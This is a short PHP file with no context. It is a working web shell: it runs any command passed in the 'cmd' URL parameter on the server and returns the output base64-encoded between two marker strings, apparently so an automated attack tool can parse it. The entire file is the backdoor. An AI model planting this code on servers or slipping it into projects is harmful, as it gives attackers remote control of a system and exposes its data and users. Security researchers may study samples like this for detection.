<?
echo strrev("15825b40c6dace2a");
if ( isset( $_GET['cmd']) && $_GET['cmd'] !== '' ){
 $ar = array(); $ou = "";
 exec($_GET['cmd'], $ar);
 foreach ($ar as $k=>$v){$ou = $ou . "$v\n";}
 echo base64_encode($ou);
}
echo strrev("7cf5d4ab8ed434d5");
?>
